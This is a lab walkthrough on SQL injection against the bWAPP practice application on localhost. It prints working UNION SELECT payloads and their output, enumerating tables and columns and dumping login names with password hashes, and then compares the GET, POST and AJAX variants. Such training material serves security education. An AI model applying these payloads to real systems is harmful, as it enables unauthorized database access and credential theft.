# bWAPP SQL Injection GET/Search - Detailed Guide

## Introduction
This document provides a step-by-step guide on exploiting SQL Injection vulnerabilities in the **bWAPP** website's **SQL Injection GET/Search** page. We will construct SQL queries and append them to the search URL in the browser to extract information from the database.

## Understanding SQL Injection
SQL Injection occurs when an application improperly constructs SQL queries, allowing attackers to manipulate database queries. By injecting SQL syntax into input fields or URLs, attackers can retrieve, modify, or delete data.

## Purpose of `'` and `--`
- **`'` (Single Quote)**: Used to close the original SQL string so that an attacker can append a custom SQL query.
- **`--` (Double Dash)**: Marks the rest of the line as a comment, effectively removing unintended SQL syntax and preventing errors.

## Executing SQL Injection via the URL
Each SQL injection attempt should be inserted **after**:
```
http://localhost/bWAPP/sqli_1.php?title=spiderman'
```
and **before**:
```
+&action=search
```

### 1. Find the Number of Columns
**Payload:**
```
UNION SELECT 1,2,3,4,5,6 --
```
**Output:**
```
2   3   5   4   Link
```
**Explanation:**
This identifies how many columns exist in the database query by ensuring the query executes without errors. The output shows which columns are visible.

### 2. Find the Database Name
**Payload:**
```
UNION SELECT 1,2,database(),4,5,6 --
```
**Output:**
```
2   bwapp   5   4   Link
```
**Explanation:**
The `database()` function retrieves the name of the currently used database, which in this case is `bwapp`.

### 3. Retrieve All Table Names
**Payload:**
```
UNION SELECT 1,2,3,4,table_name,6 from information_schema.tables --
```
**Output (excerpt):**
```
2   3   blog    4   Link
2   3   heroes  4   Link
2   3   movies  4   Link
2   3   users   4   Link
```
**Explanation:**
The `information_schema.tables` stores metadata about all tables. This query lists all table names in the database.

### 4. Retrieve Column Names of the `movies` Table
**Payload:**
```
UNION SELECT 1,2,3,4,group_concat(column_name),6 from information_schema.columns where table_name='movies' --
```
**Output:**
```
id,title,release_year,genre,main_character,imdb
```
**Explanation:**
This query extracts all column names from the `movies` table using the `information_schema.columns` metadata table.

### 5. Retrieve All Movie Titles
**Payload:**
```
UNION SELECT 1,2,3,4,group_concat(title, release_year, imdb),6 from movies --
```
**Output:**
```
G.I. Joe: Retaliation2013tt1583421,Iron Man2008tt0371746,Man of Steel2013tt0770828,Terminator Salvation2009tt0438488,...
```
**Explanation:**
This query retrieves and concatenates all movie titles, release years, and IMDB references from the `movies` table.

### 6. Retrieve Column Names of the `users` Table
**Payload:**
```
UNION SELECT 1,2,3,4,group_concat(column_name),6 from information_schema.columns where table_name='users' --
```
**Output:**
```
id,login,password,email,secret,activation_code,activated,reset_code,admin
```
**Explanation:**
This retrieves all column names for the `users` table, which contains login credentials.

### 7. Retrieve Usernames and Passwords
**Payload:**
```
UNION SELECT 1,2,3,4,group_concat(login,password),6 from users --
```
**Output:**
```
A.I.M.6885858486f31043e5839c735d99457f045affd0,bee6885858486f31043e5839c735d99457f045affd0
```
**Explanation:**
This retrieves and concatenates all usernames and their associated hashed passwords from the `users` table.


# GET/SELECT 

## Difference Between Search and Select Inputs in SQL Injection

SQL injection techniques can vary based on how the input is handled by the web application. The main difference is in the type of input used:

1. **Search Input (String-Based Input)**
   - When a search field accepts user input as a string, the input is typically enclosed in quotes within the SQL query.
   - To perform SQL injection, it's necessary to break out of the string by closing the quote before injecting the payload.
   - Commenting out the remaining part of the query is also required to prevent syntax errors.
   - Example: 
    ```sql
   	SELECT * FROM movies WHERE title = '$user_input'
   	```

2. **Select Input (Dropdown-Based Input)**
   - When using a dropdown menu, the user selects from predefined options, and the input is usually processed as a direct value without quotes.
   - SQL injection in this case doesn't require breaking out of a string since the input is not enclosed in quotes.
   - There is also no need to comment out the rest of the query, since it's structured differently from string-based inputs.
   - Example:
   ```sql
   SELECT * FROM movies WHERE genre = $user_input
   ```

## Add the following injections after movie=0 and before &action=go

**Payload:**
```
union select 1,2,3,4,5,6
```
```output
	2 	3 	5 	4 	Link
```
**Payload:**
```
union select 1,2,3,database(),5,6
```
```output
2 	3 	5 	bwapp 	Link
```
**Payload:**
```
UNION SELECT 1,2,3,4,group_concat(column_name),6 from information_schema.columns where table_name='movies' 
```
```output
2 	3 	id,title,release_year,genre,main_character,imdb 	4 	Link
```


# Difference between `POST/SEARCH` and `GET/SEARCH` 

## 1. **Method (GET vs POST):**
   - **GET**: Sends data as query parameters in the URL.
   - **POST**: Sends data in the request body, which isn't visible in the URL.

## 2. **SQL Injection Vulnerability:**
   - **GET/SEARCH**: Since the data is part of the URL, it's often logged in browser history, web server logs, and can be seen by anyone with access to the URL. This makes it easier to exploit if the input is not sanitized properly, because the malicious payload will be included in the query string visible in the URL.
   - **POST/SEARCH**: The data is sent in the request body, which means it isn't directly visible in the URL, reducing the risk of someone casually noticing the malicious input. However, if the server or application does not properly sanitize input, it can still be vulnerable to SQL injection attacks. Attackers may still use tools like Burp Suite to intercept and modify POST requests.



# AJAX Version Difference 

### 1. Request Method:
- In a regular HTTP request, the parameters would be sent as part of the URL or form submission, which triggers a page reload.
- In an AJAX-based system, JavaScript sends asynchronous HTTP requests (using `XMLHttpRequest` or `fetch`) to the server without reloading the page. The response is typically handled dynamically by JavaScript.

### 2. Query Execution:
- For a non-AJAX version, the user would usually manually enter the data in a form or the search bar, and upon submitting, the page reloads to display the results. SQL Injection is attempted directly through user input on the page.
- In AJAX, the attack would still exploit a vulnerable input, but the injected query might interact with the back-end without changing the page content. The client-side JavaScript would process the response asynchronously.

### 3. Response Handling:
- The non-AJAX version would send the entire response from the server (including the query results) in a full page reload.
- In the AJAX version, the server sends back only the relevant data (like a JSON object), and JavaScript on the client-side dynamically updates the page to show the results. The attacker could modify the response handling to display more sensitive data like column names or usernames.

### 4. Page Interactivity:
- Traditional SQL injection would result in a full-page refresh.
- In AJAX, the page remains interactive, and the results of the SQL injection could be dynamically injected into parts of the page, providing a more seamless experience for the attacker.

While the core SQL injection principles remain the same, the AJAX version introduces asynchronous behavior, meaning the attack could be more seamless, with a potential for real-time manipulation of the responses without needing to reload the page. The attacker could potentially interact with the page elements without disrupting the overall user experience.
